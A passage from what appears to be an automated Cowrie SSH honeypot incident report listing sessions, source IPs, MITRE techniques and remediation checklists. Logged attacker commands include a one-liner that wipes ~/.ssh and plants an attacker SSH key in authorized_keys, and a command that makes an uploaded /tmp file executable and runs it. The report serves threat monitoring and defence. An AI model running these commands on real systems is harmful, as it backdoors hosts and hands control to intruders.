| `2026-07-05 19:24:59` | `cowrie.client.kex` |
| `2026-07-05 19:25:05` | `cowrie.login.success` |
| `2026-07-05 19:25:08` | `cowrie.session.params` |
| `2026-07-05 19:25:08` | `cowrie.command.input` |
| `2026-07-05 19:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.178.209[.]47` to AbuseIPDB if not already reported
- [ ] Block `61.178.209[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ad9d93bce2c

| Field | Detail |
|---|---|
| **Source IP** | `178.201.162[.]195` |
| **First Seen** | 2026-07-05 19:25 |
| **Last Seen** | 2026-07-05 19:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `scp -t /tmp/ioTYDLDf` |
| **Download Attempts** | 8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c |
| **Malware Analysis** | 8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c (MEDIUM) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:25:15` | `cowrie.session.connect` |
| `2026-07-05 19:25:15` | `cowrie.client.version` |
| `2026-07-05 19:25:15` | `cowrie.client.kex` |
| `2026-07-05 19:25:16` | `cowrie.login.success` |
| `2026-07-05 19:25:16` | `cowrie.client.var` |
| `2026-07-05 19:25:17` | `cowrie.session.params` |
| `2026-07-05 19:25:17` | `cowrie.command.input` |
| `2026-07-05 19:25:17` | `cowrie.session.file_download` |
| `2026-07-05 19:25:17` | `cowrie.log.closed` |
| `2026-07-05 19:25:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.201.162[.]195` to AbuseIPDB if not already reported
- [ ] Block `178.201.162[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be8f5b1d71d4

| Field | Detail |
|---|---|
| **Source IP** | `178.201.162[.]195` |
| **First Seen** | 2026-07-05 19:25 |
| **Last Seen** | 2026-07-05 19:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `scp -t /tmp/ioTYDLDf` |
| **Download Attempts** | 8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c |
| **Malware Analysis** | 8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c (MEDIUM) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:25:15` | `cowrie.session.connect` |
| `2026-07-05 19:25:15` | `cowrie.client.version` |
| `2026-07-05 19:25:15` | `cowrie.client.kex` |
| `2026-07-05 19:25:17` | `cowrie.login.success` |
| `2026-07-05 19:25:17` | `cowrie.client.var` |
| `2026-07-05 19:25:17` | `cowrie.session.params` |
| `2026-07-05 19:25:17` | `cowrie.command.input` |
| `2026-07-05 19:25:18` | `cowrie.session.file_download` |
| `2026-07-05 19:25:18` | `cowrie.log.closed` |
| `2026-07-05 19:25:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.201.162[.]195` to AbuseIPDB if not already reported
- [ ] Block `178.201.162[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25dfae9da12f

| Field | Detail |
|---|---|
| **Source IP** | `178.201.162[.]195` |
| **First Seen** | 2026-07-05 19:25 |
| **Last Seen** | 2026-07-05 19:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp && chmod +x ioTYDLDf && bash -c ./ioTYDLDf, ./ioTYDLDf` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:25:17` | `cowrie.session.connect` |
| `2026-07-05 19:25:18` | `cowrie.client.version` |
| `2026-07-05 19:25:18` | `cowrie.client.kex` |
| `2026-07-05 19:25:18` | `cowrie.login.success` |
| `2026-07-05 19:25:18` | `cowrie.client.var` |
| `2026-07-05 19:25:19` | `cowrie.session.params` |
| `2026-07-05 19:25:19` | `cowrie.command.input` |
| `2026-07-05 19:25:19` | `cowrie.command.input` |
| `2026-07-05 19:25:19` | `cowrie.command.failed` |
| `2026-07-05 19:25:19` | `cowrie.log.closed` |
| `2026-07-05 19:25:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.201.162[.]195` to AbuseIPDB if not already reported
- [ ] Block `178.201.162[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c4ca4e73ab9

| Field | Detail |
|---|---|
| **Source IP** | `178.201.162[.]195` |
| **First Seen** | 2026-07-05 19:25 |
| **Last Seen** | 2026-07-05 19:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp && chmod +x ioTYDLDf && bash -c ./ioTYDLDf, ./ioTYDLDf` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:25:18` | `cowrie.session.connect` |
| `2026-07-05 19:25:18` | `cowrie.client.version` |
| `2026-07-05 19:25:18` | `cowrie.client.kex` |
| `2026-07-05 19:25:19` | `cowrie.login.success` |
| `2026-07-05 19:25:20` | `cowrie.client.var` |
| `2026-07-05 19:25:20` | `cowrie.session.params` |
| `2026-07-05 19:25:20` | `cowrie.command.input` |
| `2026-07-05 19:25:20` | `cowrie.command.input` |
| `2026-07-05 19:25:20` | `cowrie.command.failed` |
| `2026-07-05 19:25:20` | `cowrie.log.closed` |
| `2026-07-05 19:25:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.201.162[.]195` to AbuseIPDB if not already reported
- [ ] Block `178.201.162[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae277f22634a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 19:25 |
| **Last Seen** | 2026-07-05 19:25 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:25:39` | `cowrie.session.connect` |
| `2026-07-05 19:25:40` | `cowrie.client.version` |
| `2026-07-05 19:25:40` | `cowrie.client.kex` |
| `2026-07-05 19:25:46` | `cowrie.login.success` |
| `2026-07-05 19:25:49` | `cowrie.session.params` |
| `2026-07-05 19:25:49` | `cowrie.command.input` |
| `2026-07-05 19:25:51` | `cowrie.log.closed` |
| `2026-07-05 19:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe6ede987400

| Field | Detail |
|---|---|
| **Source IP** | `165.22.225[.]218` |
| **First Seen** | 2026-07-05 19:26 |
| **Last Seen** | 2026-07-05 19:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:26:25` | `cowrie.session.connect` |
| `2026-07-05 19:26:25` | `cowrie.client.version` |
| `2026-07-05 19:26:25` | `cowrie.client.kex` |
| `2026-07-05 19:26:25` | `cowrie.login.success` |
| `2026-07-05 19:26:26` | `cowrie.session.params` |
| `2026-07-05 19:26:26` | `cowrie.command.input` |
| `2026-07-05 19:26:26` | `cowrie.command.failed` |
| `2026-07-05 19:26:26` | `cowrie.log.closed` |
| `2026-07-05 19:26:27` | `cowrie.session.params` |
| `2026-07-05 19:26:27` | `cowrie.command.input` |
| `2026-07-05 19:26:27` | `cowrie.session.file_download` |
| `2026-07-05 19:26:27` | `cowrie.log.closed` |
| `2026-07-05 19:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.225[.]218` to AbuseIPDB if not already reported
- [ ] Block `165.22.225[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb0fcb5ab2ae

| Field | Detail |
|---|---|
| **Source IP** | `165.22.225[.]218` |
| **First Seen** | 2026-07-05 19:26 |
| **Last Seen** | 2026-07-05 19:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:26:27` | `cowrie.session.connect` |
| `2026-07-05 19:26:27` | `cowrie.client.version` |
| `2026-07-05 19:26:27` | `cowrie.client.kex` |
| `2026-07-05 19:26:27` | `cowrie.login.success` |
| `2026-07-05 19:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.225[.]218` to AbuseIPDB if not already reported
- [ ] Block `165.22.225[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a47c5ee48fd9

| Field | Detail |
|---|---|
| **Source IP** | `165.22.225[.]218` |
| **First Seen** | 2026-07-05 19:26 |
| **Last Seen** | 2026-07-05 19:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:26:27` | `cowrie.session.connect` |
| `2026-07-05 19:26:27` | `cowrie.client.version` |
| `2026-07-05 19:26:27` | `cowrie.client.kex` |
| `2026-07-05 19:26:27` | `cowrie.login.success` |
| `2026-07-05 19:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.225[.]218` to AbuseIPDB if not already reported
- [ ] Block `165.22.225[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ef67e47d5bc

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-05 19:30 |
| **Last Seen** | 2026-07-05 19:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:30:03` | `cowrie.session.connect` |
| `2026-07-05 19:30:03` | `cowrie.client.version` |
| `2026-07-05 19:30:03` | `cowrie.client.kex` |
| `2026-07-05 19:30:04` | `cowrie.login.success` |
| `2026-07-05 19:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72a5851a8df0

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-05 19:30 |
| **Last Seen** | 2026-07-05 19:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:30:03` | `cowrie.session.connect` |
| `2026-07-05 19:30:03` | `cowrie.client.version` |
| `2026-07-05 19:30:03` | `cowrie.client.kex` |
| `2026-07-05 19:30:04` | `cowrie.login.success` |
| `2026-07-05 19:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a9cc5184fda

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-05 19:30 |
| **Last Seen** | 2026-07-05 19:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:30:06` | `cowrie.session.connect` |
| `2026-07-05 19:30:06` | `cowrie.client.version` |
| `2026-07-05 19:30:06` | `cowrie.client.kex` |
| `2026-07-05 19:30:06` | `cowrie.login.success` |
| `2026-07-05 19:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f33e20cb32a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-05 19:30 |
| **Last Seen** | 2026-07-05 19:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:30:07` | `cowrie.session.connect` |
| `2026-07-05 19:30:07` | `cowrie.client.version` |
| `2026-07-05 19:30:07` | `cowrie.client.kex` |
| `2026-07-05 19:30:07` | `cowrie.login.success` |
| `2026-07-05 19:30:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e264c7bb0b6

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-05 19:30 |
| **Last Seen** | 2026-07-05 19:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:30:53` | `cowrie.session.connect` |
| `2026-07-05 19:30:53` | `cowrie.client.version` |
| `2026-07-05 19:30:53` | `cowrie.client.kex` |
| `2026-07-05 19:30:53` | `cowrie.login.success` |
| `2026-07-05 19:30:54` | `cowrie.session.params` |
| `2026-07-05 19:30:54` | `cowrie.command.input` |
| `2026-07-05 19:30:54` | `cowrie.log.closed` |
| `2026-07-05 19:30:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de43c1d08d7b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 19:31 |
| **Last Seen** | 2026-07-05 19:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:31:25` | `cowrie.session.connect` |
| `2026-07-05 19:31:25` | `cowrie.client.version` |
| `2026-07-05 19:31:25` | `cowrie.client.kex` |
| `2026-07-05 19:31:25` | `cowrie.login.success` |
| `2026-07-05 19:31:25` | `cowrie.direct-tcpip.request` |
| `2026-07-05 19:31:25` | `cowrie.direct-tcpip.data` |
| `2026-07-05 19:31:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-372874733ab3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 19:36 |
| **Last Seen** | 2026-07-05 19:37 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:36:59` | `cowrie.session.connect` |
| `2026-07-05 19:37:01` | `cowrie.client.version` |
| `2026-07-05 19:37:01` | `cowrie.client.kex` |
| `2026-07-05 19:37:07` | `cowrie.login.success` |
| `2026-07-05 19:37:10` | `cowrie.session.params` |
| `2026-07-05 19:37:10` | `cowrie.command.input` |
| `2026-07-05 19:37:11` | `cowrie.log.closed` |
| `2026-07-05 19:37:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73d220c1ceba

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-07-05 19:37 |
| **Last Seen** | 2026-07-05 19:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:37:44` | `cowrie.session.connect` |
| `2026-07-05 19:37:44` | `cowrie.client.version` |
| `2026-07-05 19:37:44` | `cowrie.client.kex` |
| `2026-07-05 19:37:45` | `cowrie.login.success` |
| `2026-07-05 19:37:46` | `cowrie.session.params` |
| `2026-07-05 19:37:46` | `cowrie.command.input` |
| `2026-07-05 19:37:46` | `cowrie.command.failed` |
| `2026-07-05 19:37:46` | `cowrie.log.closed` |
| `2026-07-05 19:37:47` | `cowrie.session.params` |
| `2026-07-05 19:37:47` | `cowrie.command.input` |
| `2026-07-05 19:37:47` | `cowrie.session.file_download` |
| `2026-07-05 19:37:47` | `cowrie.log.closed` |
| `2026-07-05 19:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c06ecaf13d16

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-07-05 19:37 |
| **Last Seen** | 2026-07-05 19:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:37:48` | `cowrie.session.connect` |
| `2026-07-05 19:37:48` | `cowrie.client.version` |
| `2026-07-05 19:37:48` | `cowrie.client.kex` |
| `2026-07-05 19:37:49` | `cowrie.login.success` |
| `2026-07-05 19:37:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0dd245b0d7f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-07-05 19:37 |
| **Last Seen** | 2026-07-05 19:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:37:49` | `cowrie.session.connect` |
| `2026-07-05 19:37:49` | `cowrie.client.version` |
| `2026-07-05 19:37:49` | `cowrie.client.kex` |
| `2026-07-05 19:37:50` | `cowrie.login.success` |
| `2026-07-05 19:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68a65df75a34

| Field | Detail |
|---|---|
| **Source IP** | `61.76.38[.]54` |
| **First Seen** | 2026-07-05 19:40 |
| **Last Seen** | 2026-07-05 19:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:40:37` | `cowrie.session.connect` |
| `2026-07-05 19:40:37` | `cowrie.client.version` |
| `2026-07-05 19:40:37` | `cowrie.client.kex` |
| `2026-07-05 19:40:38` | `cowrie.login.success` |
| `2026-07-05 19:40:39` | `cowrie.session.params` |
| `2026-07-05 19:40:39` | `cowrie.command.input` |
| `2026-07-05 19:40:39` | `cowrie.command.failed` |
| `2026-07-05 19:40:40` | `cowrie.log.closed` |
| `2026-07-05 19:40:40` | `cowrie.session.params` |
| `2026-07-05 19:40:40` | `cowrie.command.input` |
| `2026-07-05 19:40:40` | `cowrie.session.file_download` |
| `2026-07-05 19:40:40` | `cowrie.log.closed` |
| `2026-07-05 19:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.38[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.76.38[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eb9b3083bbb

| Field | Detail |
|---|---|
| **Source IP** | `61.76.38[.]54` |
| **First Seen** | 2026-07-05 19:40 |
| **Last Seen** | 2026-07-05 19:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:40:41` | `cowrie.session.connect` |
| `2026-07-05 19:40:41` | `cowrie.client.version` |
| `2026-07-05 19:40:41` | `cowrie.client.kex` |
| `2026-07-05 19:40:42` | `cowrie.login.success` |
| `2026-07-05 19:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.38[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.76.38[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fa3deccd9c5

| Field | Detail |
|---|---|
| **Source IP** | `61.76.38[.]54` |
| **First Seen** | 2026-07-05 19:40 |
| **Last Seen** | 2026-07-05 19:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:40:42` | `cowrie.session.connect` |
| `2026-07-05 19:40:42` | `cowrie.client.version` |
| `2026-07-05 19:40:42` | `cowrie.client.kex` |
| `2026-07-05 19:40:43` | `cowrie.login.success` |
| `2026-07-05 19:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.38[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.76.38[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2b5fa3c39ea

| Field | Detail |
|---|---|
| **Source IP** | `54.38.52[.]18` |
| **First Seen** | 2026-07-05 19:41 |
| **Last Seen** | 2026-07-05 19:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:41:37` | `cowrie.session.connect` |
